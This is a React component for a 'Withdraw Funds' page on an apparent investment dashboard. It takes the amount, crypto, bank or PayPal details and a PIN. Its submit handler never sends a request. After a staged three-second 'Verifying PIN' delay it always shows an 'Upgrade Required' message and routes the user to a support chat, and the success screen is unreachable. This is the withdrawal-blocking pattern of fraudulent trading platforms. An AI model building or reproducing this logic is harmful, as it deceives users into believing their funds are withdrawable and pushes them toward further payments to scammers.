import { useState, useEffect } from 'react';
import {
    Wallet,
    AlertTriangle,
    ChevronRight,
    ShieldCheck,
    CreditCard,
    Building2,
    Mail,
    Lock
} from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import api from '../../services/api';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../../context/AuthContext';

const Withdraw = () => {
    const navigate = useNavigate();
    const { user } = useAuth();
    const [step, setStep] = useState(1);
    const [account, setAccount] = useState<any>(null);
    const [isLoading, setIsLoading] = useState(false);

    const [method, setMethod] = useState<'crypto' | 'bank' | 'paypal'>('crypto');
    const [formData, setFormData] = useState({
        amount: '',
        coin: 'BTC',
        address: '',
        bankName: '',
        accountNumber: '',
        accountName: '',
        swiftCode: '',
        paypalEmail: '',
        pin: ''
    });

    useEffect(() => {
        // Redir if no pin
        if (user && !user.hasWithdrawalPin) {
            navigate('/dashboard/settings'); // Or a dedicated pin setup page
        }

        const fetchBalance = async () => {
            try {
                const { data } = await api.get('/user/profile');
                setAccount(data.account);
            } catch (err) {
                console.error(err);
            }
        };
        fetchBalance();
    }, [user, navigate]);

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!formData.amount || isNaN(Number(formData.amount))) return alert('Please enter a valid amount');
        if (formData.pin.length < 4) return alert('Please enter your 4-6 digit withdrawal PIN');

        setIsLoading(true);

        // Simulate processing delay then show upgrade message
        setTimeout(() => {
            setIsLoading(false);
            setStep(3);
        }, 3000);
    };

    return (
        <div className="max-w-xl mx-auto space-y-8 pb-10">
            <div className="text-center space-y-2">
                <h1 className="text-3xl font-black">Withdraw Funds</h1>
                <p className="text-text-muted">Securely transfer your profits using your preferred method.</p>
            </div>

            <div className="card-gradient p-8 md:p-10 rounded-[40px] shadow-2xl relative overflow-hidden">
                {step === 1 ? (
                    <form onSubmit={handleSubmit} className="space-y-8">
                        <div className="space-y-6">
                            {/* Amount Input */}
                            <div className="space-y-3">
                                <div className="flex justify-between items-center ml-1">
                                    <label className="text-xs font-black uppercase text-text-muted tracking-widest">Amount to Withdraw</label>
                                    <span className="text-xs text-text-muted">Available: <span className="text-accent font-black">${account ? account.balance.toLocaleString() : '0.00'}</span></span>
                                </div>
                                <div className="relative group">
                                    <div className="absolute left-4 top-1/2 -translate-y-1/2 text-text-muted group-focus-within:text-accent font-bold">$</div>
                                    <input
                                        type="number"
                                        required
                                        placeholder="0.00"
                                        value={formData.amount}
                                        onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
                                        className="w-full bg-background border border-border px-8 py-4 rounded-xl focus:ring-2 focus:ring-accent outline-none font-bold placeholder:text-gray-800 transition-all text-xl"
                                    />
                                </div>
                            </div>

                            {/* Method Selection */}
                            <div className="space-y-3">
                                <label className="text-xs font-black uppercase text-text-muted tracking-widest ml-1 block">Withdrawal Method</label>
                                <div className="grid grid-cols-3 gap-3">
                                    {[
                                        { id: 'crypto', label: 'Crypto', icon: Wallet },
                                        { id: 'bank', label: 'Bank', icon: Building2 },
                                        { id: 'paypal', label: 'PayPal', icon: CreditCard }
                                    ].map((m) => (
                                        <button
                                            key={m.id}
                                            type="button"
                                            onClick={() => setMethod(m.id as any)}
                                            className={`px-4 py-4 rounded-xl border text-[10px] font-black uppercase tracking-widest transition-all flex flex-col items-center space-y-2 ${method === m.id ? 'bg-accent/10 border-accent text-accent shadow-lg shadow-accent/5' : 'bg-background border-border text-text-muted hover:border-accent/30'
                                                }`}
                                        >
                                            <m.icon className="w-5 h-5" />
                                            <span>{m.label}</span>
                                        </button>
                                    ))}
                                </div>
                            </div>

                            <AnimatePresence mode="wait">
                                {method === 'crypto' && (
                                    <motion.div
                                        key="crypto"
                                        initial={{ opacity: 0, y: 10 }}
                                        animate={{ opacity: 1, y: 0 }}
                                        exit={{ opacity: 0, y: -10 }}
                                        className="space-y-4"
                                    >
                                        <div className="grid grid-cols-3 gap-2">
                                            {['BTC', 'ETH', 'USDT'].map(c => (
                                                <button
                                                    key={c}
                                                    type="button"
                                                    onClick={() => setFormData({ ...formData, coin: c })}
                                                    className={`py-2 rounded-lg border text-[10px] font-black transition-all ${formData.coin === c ? 'bg-accent text-white border-accent' : 'bg-background border-border text-text-muted'}`}
                                                >
                                                    {c}
                                                </button>
                                            ))}
                                        </div>
                                        <div className="relative group">
                                            <Wallet className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-text-muted group-focus-within:text-accent transition-colors" />
                                            <input
                                                type="text"
                                                required={method === 'crypto'}
                                                placeholder="Enter your destination address"
                                                value={formData.address}
                                                onChange={(e) => setFormData({ ...formData, address: e.target.value })}
                                                className="w-full bg-background border border-border px-12 py-4 rounded-xl focus:ring-2 focus:ring-accent outline-none font-mono text-sm placeholder:text-gray-800 transition-all"
                                            />
                                        </div>
                                    </motion.div>
                                )}

                                {method === 'bank' && (
                                    <motion.div
                                        key="bank"
                                        initial={{ opacity: 0, y: 10 }}
                                        animate={{ opacity: 1, y: 0 }}
                                        exit={{ opacity: 0, y: -10 }}
                                        className="space-y-4"
                                    >
                                        <input
                                            type="text"
                                            required={method === 'bank'}
                                            placeholder="Bank Name"
                                            value={formData.bankName}
                                            onChange={(e) => setFormData({ ...formData, bankName: e.target.value })}
                                            className="w-full bg-background border border-border px-6 py-4 rounded-xl focus:ring-2 focus:ring-accent outline-none font-bold text-sm"
                                        />
                                        <div className="grid grid-cols-2 gap-4">
                                            <input
                                                type="text"
                                                required={method === 'bank'}
                                                placeholder="Account Number"
                                                value={formData.accountNumber}
                                                onChange={(e) => setFormData({ ...formData, accountNumber: e.target.value })}
                                                className="w-full bg-background border border-border px-6 py-4 rounded-xl focus:ring-2 focus:ring-accent outline-none font-bold text-sm"
                                            />
                                            <input
                                                type="text"
                                                required={method === 'bank'}
                                                placeholder="SWIFT / BIC Code"
                                                value={formData.swiftCode}
                                                onChange={(e) => setFormData({ ...formData, swiftCode: e.target.value })}
                                                className="w-full bg-background border border-border px-6 py-4 rounded-xl focus:ring-2 focus:ring-accent outline-none font-bold text-sm"
                                            />
                                        </div>
                                        <input
                                            type="text"
                                            required={method === 'bank'}
                                            placeholder="Account Holder Name"
                                            value={formData.accountName}
                                            onChange={(e) => setFormData({ ...formData, accountName: e.target.value })}
                                            className="w-full bg-background border border-border px-6 py-4 rounded-xl focus:ring-2 focus:ring-accent outline-none font-bold text-sm"
                                        />
                                    </motion.div>
                                )}

                                {method === 'paypal' && (
                                    <motion.div
                                        key="paypal"
                                        initial={{ opacity: 0, y: 10 }}
                                        animate={{ opacity: 1, y: 0 }}
                                        exit={{ opacity: 0, y: -10 }}
                                        className="space-y-4"
                                    >
                                        <div className="relative group">
                                            <Mail className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-text-muted group-focus-within:text-accent transition-colors" />
                                            <input
                                                type="email"
                                                required={method === 'paypal'}
                                                placeholder="PayPal Email Address"
                                                value={formData.paypalEmail}
                                                onChange={(e) => setFormData({ ...formData, paypalEmail: e.target.value })}
                                                className="w-full bg-background border border-border px-12 py-4 rounded-xl focus:ring-2 focus:ring-accent outline-none font-bold text-sm"
                                            />
                                        </div>
                                    </motion.div>
                                )}
                            </AnimatePresence>

                            {/* PIN Verification */}
                            <div className="space-y-3 pt-4 border-t border-border">
                                <label className="text-[10px] font-black uppercase text-accent tracking-widest ml-1 block">Security PIN Required</label>
                                <div className="relative group">
                                    <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-accent/50 group-focus-within:text-accent transition-colors" />
                                    <input
                                        type="password"
                                        required
                                        maxLength={6}
                                        placeholder="Enter Withdrawal PIN"
                                        value={formData.pin}
                                        onChange={(e) => setFormData({ ...formData, pin: e.target.value.replace(/\D/g, '') })}
                                        className="w-full bg-background border-2 border-accent/20 px-12 py-4 rounded-xl focus:ring-4 focus:ring-accent/10 focus:border-accent outline-none font-black text-center text-xl tracking-[1em] transition-all"
                                    />
                                </div>
                            </div>
                        </div>

                        <div className="p-4 bg-orange-500/10 border border-orange-500/20 rounded-2xl flex items-start space-x-3">
                            <AlertTriangle className="w-5 h-5 text-orange-500 mt-0.5 flex-shrink-0" />
                            <p className="text-[10px] text-orange-200 leading-relaxed">Withdrawals are processed manually for security. It may take up to 24 hours to appear in your account. Ensure all details are correct. <span className="font-bold underline text-white">Verification PIN required for all requests.</span></p>
                        </div>

                        <button
                            type="submit"
                            disabled={isLoading}
                            className="w-full bg-accent hover:bg-blue-600 disabled:opacity-50 text-white py-4 rounded-xl font-bold text-lg flex items-center justify-center space-x-2 transition-all shadow-xl shadow-blue-500/30 group"
                        >
                            <span>{isLoading ? 'Verifying PIN...' : 'Submit Withdrawal'}</span>
                            <ChevronRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
                        </button>
                    </form>
                ) : step === 2 ? (
                    <motion.div
                        initial={{ opacity: 0, scale: 0.9 }}
                        animate={{ opacity: 1, scale: 1 }}
                        className="text-center space-y-6 py-4"
                    >
                        <div className="w-20 h-20 bg-green-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
                            <ShieldCheck className="w-10 h-10 text-green-500" />
                        </div>
                        <h3 className="text-2xl font-black italic">Request Authenticated</h3>
                        <p className="text-text-muted">Your withdrawal of <span className="text-white font-black">${formData.amount}</span> via <span className="text-accent uppercase font-black">{method}</span> is currently being processed by our financial team.</p>
                        <hr className="border-border" />
                        <div className="space-y-4">
                            <p className="text-[10px] text-text-muted leading-relaxed uppercase tracking-widest font-black">Tracking ID: {Math.random().toString(36).substring(7).toUpperCase()}</p>
                            <p className="text-[10px] text-text-muted leading-relaxed">A confirmation transcript has been sent to your registered email. Please wait for administrator approval.</p>
                            <button
                                onClick={() => navigate('/dashboard/history')}
                                className="w-full py-4 rounded-xl bg-secondary border border-border font-bold hover:bg-white/5 transition-colors"
                            >
                                View Transaction Status
                            </button>
                        </div>
                    </motion.div>
                ) : (
                    <motion.div
                        initial={{ opacity: 0, scale: 0.9 }}
                        animate={{ opacity: 1, scale: 1 }}
                        className="text-center space-y-6 py-4"
                    >
                        <div className="w-20 h-20 bg-red-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
                            <AlertTriangle className="w-10 h-10 text-red-500" />
                        </div>
                        <h3 className="text-2xl font-black text-red-500">Upgrade Required</h3>
                        <p className="text-text-muted text-lg font-medium leading-relaxed">
                            You need to upgrade your account before you can withdraw.
                            <br />
                            Please contact customer support to proceed.
                        </p>
                        <hr className="border-border opacity-50" />
                        <button
                            onClick={() => navigate('/dashboard/admin/chat')}
                            className="w-full py-4 rounded-xl bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white font-bold text-lg transition-all shadow-xl shadow-red-500/20 flex items-center justify-center space-x-2"
                        >
                            <ShieldCheck className="w-5 h-5" />
                            <span>Contact Customer Support</span>
                        </button>
                    </motion.div>
                )}
            </div>
        </div>
    );
};

export default Withdraw;
